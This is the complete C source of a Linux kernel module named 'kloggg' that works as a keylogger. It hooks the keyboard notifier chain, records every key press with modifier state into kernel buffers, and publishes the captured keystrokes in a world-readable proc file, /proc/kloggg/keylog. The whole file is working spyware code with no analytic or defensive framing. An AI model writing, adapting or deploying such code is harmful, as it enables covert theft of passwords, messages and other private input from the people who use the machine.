#include <linux/init.h>
#include <linux/module.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include "kloggg-keymap.h" /* produced by output of "loadkeys --mktable" */

MODULE_AUTHOR("Nicholas Hubbard");
MODULE_LICENSE("GPL");

#define MAX_PROC_BUF_SIZE (1 << 14) // 16 KB buffer
#define KEYBUF_SIZE 2048

static u_short cur_keybuf[KEYBUF_SIZE];
static unsigned int cur_keybuf_idx = 0;

typedef struct keybuf_history_t {
  u_short keybuf[KEYBUF_SIZE];
  struct keybuf_history_t *next;
} keybuf_history_t;

static keybuf_history_t *keybuf_history;

static void flush_keybuf_history(void) {
  keybuf_history_t *h = keybuf_history;
  while (h) {
    keybuf_history_t *next = h->next;
    kfree(h);
    h = next;
  }
  keybuf_history = NULL;
}

static void append_keybuf_to_history(u_short *keybuf) {
  keybuf_history_t *new = kmalloc(sizeof(keybuf_history_t), GFP_KERNEL);
  if (!new) {
    return;
  }
  memcpy(new->keybuf, keybuf, sizeof(new->keybuf));
  new->next = NULL;

  if (!keybuf_history) {
    keybuf_history = new;
  }
  else {
    keybuf_history_t *last = keybuf_history;
    while (last->next != NULL) {
      last = last->next;
    }
    last->next = new;
  }
}

/* proc_fs */
static struct proc_dir_entry *kloggg_proc_dir;
static struct proc_dir_entry *kloggg_proc_file;

static ssize_t kloggg_proc_file_read(struct file *file, char __user *ubuf, size_t count, loff_t *ppos) {
  char *kbuf;
  ssize_t len = 0;
  keybuf_history_t *entry;
  int i;

  // Only allow reading once (standard proc file behavior)
  if (*ppos > 0)
    return 0;

  kbuf = kmalloc(MAX_PROC_BUF_SIZE, GFP_KERNEL);
  if (!kbuf)
    return -ENOMEM;

  // Print historical buffers
  entry = keybuf_history;
  while (entry && len < MAX_PROC_BUF_SIZE - 64) {
    len += scnprintf(kbuf + len, MAX_PROC_BUF_SIZE - len, "History:\n");

    for (i = 0; i < KEYBUF_SIZE && len < MAX_PROC_BUF_SIZE - 8; i++) {
      len += scnprintf(kbuf + len, MAX_PROC_BUF_SIZE - len, "%04x ", entry->keybuf[i]);
      if ((i + 1) % 16 == 0)
        len += scnprintf(kbuf + len, MAX_PROC_BUF_SIZE - len, "\n");
    }

    len += scnprintf(kbuf + len, MAX_PROC_BUF_SIZE - len, "\n");
    entry = entry->next;
  }

  // Print current buffer
  len += scnprintf(kbuf + len, MAX_PROC_BUF_SIZE - len, "Current:\n");
  for (i = 0; i < cur_keybuf_idx && len < MAX_PROC_BUF_SIZE - 8; i++) {
    len += scnprintf(kbuf + len, MAX_PROC_BUF_SIZE - len, "%04x ", cur_keybuf[i]);
    if ((i + 1) % 16 == 0)
      len += scnprintf(kbuf + len, MAX_PROC_BUF_SIZE - len, "\n");
  }
  len += scnprintf(kbuf + len, MAX_PROC_BUF_SIZE - len, "\n");

  if (copy_to_user(ubuf, kbuf, len)) {
    kfree(kbuf);
    return -EFAULT;
  }

  kfree(kbuf);
  *ppos = len;
  flush_keybuf_history();
  cur_keybuf_idx = 0;
  return len;
}

static ssize_t kloggg_proc_file_write(struct file *file, const char __user *ubuf, size_t count, loff_t *ppos) {
  return 0; /* no writing allowed */
}

static struct proc_ops kloggg_fops = {
  .proc_read = kloggg_proc_file_read,
  .proc_write = kloggg_proc_file_write
};


static u_short kloggg_keycode_to_symbol(unsigned int keycode, int shift_mask) {
  u_short symbol;
  if ((shift_mask & (1 << KG_SHIFT)) && (shift_mask & (1 << KG_CTRL))) {
    symbol = shift_ctrl_map[keycode];
  }
  else if ((shift_mask & (1 << KG_ALT)) && (shift_mask & (1 << KG_CTRL))) {
    symbol = ctrl_alt_map[keycode];
  }
  else if ((shift_mask & (1 << KG_ALTGR)) && (shift_mask & (1 << KG_CTRL))) {
    symbol = altgr_ctrl_map[keycode];
  }
  else if ((shift_mask & (1 << KG_SHIFT)) && (shift_mask & (1 << KG_ALT))) {
    symbol = shift_alt_map[keycode];
  }
  else if (shift_mask & (1 << KG_SHIFT)) {
    symbol = shift_map[keycode];
  }
  else if (shift_mask & (1 << KG_ALTGR)) {
    symbol = altgr_map[keycode];
  }
  else if (shift_mask & (1 << KG_ALT)) {
    symbol = alt_map[keycode];
  }
  else if (shift_mask & (1 << KG_CTRL)) {
    symbol = ctrl_map[keycode];
  }
  else {
    symbol = plain_map[keycode];
  }
  return symbol;
}

static int kloggg_log(struct notifier_block *nb, unsigned long action, void *data) {
  struct keyboard_notifier_param *param = data;
  if (action == KBD_KEYCODE && param->down) {
    unsigned int keycode = param->value;
    int shift_mask = param->shift;
    u_short symbol = kloggg_keycode_to_symbol(keycode, shift_mask);
    if (cur_keybuf_idx < KEYBUF_SIZE) {
      cur_keybuf[cur_keybuf_idx] = symbol;
      cur_keybuf_idx++;
    }
    else {
      append_keybuf_to_history(cur_keybuf);
      cur_keybuf_idx = 0;
    }
  }

  return NOTIFY_OK;
}

static struct notifier_block kloggg_nb = {
  .notifier_call = kloggg_log
};

/* Module initialization */
static int __init kloggg_init(void) {
  kloggg_proc_dir = proc_mkdir("kloggg", NULL);
  kloggg_proc_file = proc_create("keylog", 0644, kloggg_proc_dir, &kloggg_fops);
  register_keyboard_notifier(&kloggg_nb);
  return 0;
}

/* Module cleanup */
static void __exit kloggg_exit(void) {
  proc_remove(kloggg_proc_file);
  proc_remove(kloggg_proc_dir);
  unregister_keyboard_notifier(&kloggg_nb);
}

module_init(kloggg_init);
module_exit(kloggg_exit);
